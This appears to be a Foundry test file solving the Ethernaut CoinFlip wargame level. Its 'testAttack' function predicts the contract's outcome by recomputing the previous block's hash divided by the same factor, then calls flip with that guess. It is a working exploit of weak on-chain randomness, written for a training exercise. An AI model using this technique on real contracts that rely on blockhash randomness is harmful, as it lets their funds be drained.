// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {CoinFlip} from "ethernaut/levels/CoinFlip.sol";

contract CounterTest is Test {
    CoinFlip public victim;

    function setUp() public {
        victim = new CoinFlip();
    }

    function testAttack() external {
        bool _guess = guess();
        victim.flip(_guess);
    }

    function guess() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}
